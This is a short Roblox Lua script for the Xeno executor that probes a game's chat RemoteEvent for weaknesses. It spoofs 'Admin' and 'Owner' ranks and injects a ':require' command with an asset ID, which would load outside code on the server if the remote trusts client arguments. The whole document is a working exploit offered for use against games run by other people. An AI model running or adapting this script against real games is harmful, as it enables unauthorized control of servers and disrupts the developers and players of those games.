-- XENO: ARGUMENT OVERFLOW TEST
local remote = game:GetService("ReplicatedStorage"):WaitForChild("ModernChatRemote")
local ID = 12345678 -- Your ID

-- Test 1: The 'Rank' Spoof
remote:FireServer("a", "Admin") 

-- Test 2: The 'Command' Inject (Sending 'a' as the message and the command as arg 2)
remote:FireServer("a", ":require " .. ID)

-- Test 3: The 'Table' Inject (If the AI expects a table but the UI sends a string)
remote:FireServer({["Message"] = "a", ["Rank"] = "Owner", ["Command"] = ":require " .. ID})
